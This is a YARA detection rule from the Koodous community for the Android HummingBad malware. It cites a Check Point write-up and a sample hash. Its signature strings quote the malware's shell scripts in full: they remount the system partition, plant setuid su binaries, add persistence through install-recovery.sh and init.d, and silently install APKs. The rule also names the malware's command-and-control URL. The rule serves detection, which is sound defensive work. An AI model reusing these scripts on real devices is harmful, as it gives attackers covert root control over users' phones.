/*
    Koodous Community Public Rule. Create your own rules to detect malware 
    for android at: https://koodous.com/
    
    Author: oguzhantopgul
    Rule name: HummingBad
    Rule id: 1185
    Created at: 2016-02-08 12:30:47
    Updated at: 2016-02-08 12:38:41
    
    Rating: #0
    Total detections: 35
*/

import "androguard"

rule Android_HummingBad
{
	meta:
		description = "This rule detects Android.HummingBad, trying to root the device"
		sample = "743eb17efb06fa50a8f80b066d162dcd2873b8b94adf79ebf5bed642888a6abd  "
		source = "http://blog.checkpoint.com/2016/02/04/hummingbad-a-persistent-mobile-chain-attack/"

	strings:
		$string_1 = "#!/system/bin/sh\nipm\npm install -r $APKPATH/$APKFILE\necho sucess\n"
		$string_2 = "#!/system/bin/sh\nmount -o rw,remount /system\ncat $APKPATH/$APKFILE > /system/app/$APKFILE\nchmod 0644 /system/app/$APKFILE\npm install -r /system/app/$APKFILE\n\nmount -o ro,remount /system\necho sucess\n"
		$string_3 = "#!/system/bin/sh\n#Power by www.rootzhushou.com\n#Pansing\n\nTEMPPATH=/data/data/$PACKAGE/files\nBUSYBOX=/data/data/$PACKAGE/files/busybox\nexport PATH=$TEMPPATH:$PATH\n\nchmod 777 $TEMPPATH/busybox\nuid=$(busybox id -u)\nif [ $uid -ne 0 ]; then\necho \"Are you root ? OK ,try anyway.\"\nfi\nbusybox mount -o remount,rw /system\nbusybox cat $TEMPPATH/su > /system/xbin/su\nchown 0.0 /system/xbin/su\nchmod 6755 /system/xbin/su\nbusybox cat $TEMPPATH/busybox > /system/xbin/busybox\nchown 0.0 /system/xbin/busybox\nchmod 755 /system/xbin/busybox\necho \"Now, your device is rooted !\"\nsync\n"
		$string_4 = "#!/system/bin/sh\nmount -o rw,remount /system\n/data/data/$PACKAGE/files/busybox mount -o rw,remount /system\n/system/bin/stop nac_server\n/data/data/$PACKAGE/files/busybox rm -r -f /system/xbin/su\n/data/data/$PACKAGE/files/busybox rm -r -f /system/bin/su\n/data/data/$PACKAGE/files/busybox rm -r -f /system/bin/ipm\n/data/data/$PACKAGE/files/busybox rm -r -f /system/xbin/daemonsu\n/data/data/$PACKAGE/files/busybox cat /data/data/$PACKAGE/files/su > /system/bin/su\n/data/data/$PACKAGE/files/busybox cat /data/data/$PACKAGE/files/ipm > /system/bin/ipm\n/data/data/$PACKAGE/files/busybox chown 0.0 /system/bin/su\n/data/data/$PACKAGE/files/busybox chmod 6755 /system/bin/su\n/data/data/$PACKAGE/files/busybox chown 0.0 /system/bin/ipm\n/data/data/$PACKAGE/files/busybox chmod 6755 /system/bin/ipm\n/data/data/$PACKAGE/files/busybox cat /system/bin/su > /system/xbin/su\n/data/data/$PACKAGE/files/busybox chown 0.0 /system/xbin/su\n/data/data/$PACKAGE/files/busybox chmod 6755 /system/xbin/su\n/data/data/$PACKAGE/files/busybox cat /system/xbin/su > /system/xbin/daemonsu\n/data/data/$PACKAGE/files/busybox chown 0.0 /system/xbin/daemonsu\n/data/data/$PACKAGE/files/busybox chmod 6755 /system/xbin/daemonsu\n/data/data/$PACKAGE/files/busybox cat /system/xbin/su > /system/xbin/ku.sud\n/data/data/$PACKAGE/files/busybox chown 0.0 /system/xbin/ku.sud\n/data/data/$PACKAGE/files/busybox chmod 6755 /system/xbin/ku.sud\n/data/data/$PACKAGE/files/busybox cat /data/data/$PACKAGE/files/install-recovery.sh > /system/etc/install-recovery.sh\n/data/data/$PACKAGE/files/busybox chown 0.0 /system/etc/install-recovery.sh\n/data/data/$PACKAGE/files/busybox chmod 6755 /system/etc/install-recovery.sh\n/data/data/$PACKAGE/files/busybox cat /data/data/$PACKAGE/files/99SuperSUDaemon > /system/etc/init.d/99SuperSUDaemon\n/data/data/$PACKAGE/files/busybox chown 0.0 /system/etc/init.d/99SuperSUDaemon\n/data/data/$PACKAGE/files/busybox chmod 6755 /system/etc/init.d/99SuperSUDaemon\n\nmount -o ro,remount /system\n/data/data/$PACKAGE/files/busybox mount -o ro,remount /system\necho \"Now, script finish!\"\n"
		$string_5 = "#!/system/bin/sh\n#Power by www.rootzhushou.com\n#Pansing\n\nTEMPPATH=/data/data/$PACKAGE/files\nBUSYBOX=/data/data/$PACKAGE/files/busybox\nexport PATH=$TEMPPATH:$PATH\n\nchmod 777 $TEMPPATH/busybox\nuid=$(busybox id -u)\nif [ $uid -ne 0 ]; then\necho \"Are you root ? OK ,try anyway.\"\nfi\nmount -o remount,rw /system\n$BUSYBOX mount -o remount,rw /system\nif [ -e \"/system/xbin/su\" -o -L \"/system/xbin/su\" ]; then\necho \"Delete xbin su ...\"\n$BUSYBOX rm -rf /system/xbin/su\nfi\nr\nif [ -e \"/system/bin/su\" -o -L \"/system/bin/su\" ]; then\necho \"Delete bin su ...\"\n$BUSYBOX rm -rf /system/bin/su\nfi\n/system/bin/stop nac_server\n$BUSYBOX cat $TEMPPATH/su > /system/xbin/su\n$BUSYBOX chown 0.0 /system/xbin/su\n$BUSYBOX chmod 6755 /system/xbin/su\n$BUSYBOX cat /system/xbin/su > /system/bin/su\n$BUSYBOX chown 0.0 /system/bin/su\n$BUSYBOX chmod 6755 /system/bin/su\n$BUSYBOX cat $TEMPPATH/busybox > /system/xbin/busybox\n$BUSYBOX chown 0.0 /system/xbin/busybox\n$BUSYBOX chmod 755 /system/xbin/busybox\n\necho \"Now, your device is rooted !\"\nsync\n"
		$string_6 = "http://ppsdk.hmapi.com:10081/ppsdkpost.do"	
	
	condition:
		$string_1 and $string_2 and $string_3 and $string_4 and $string_5 and $string_6
		
}
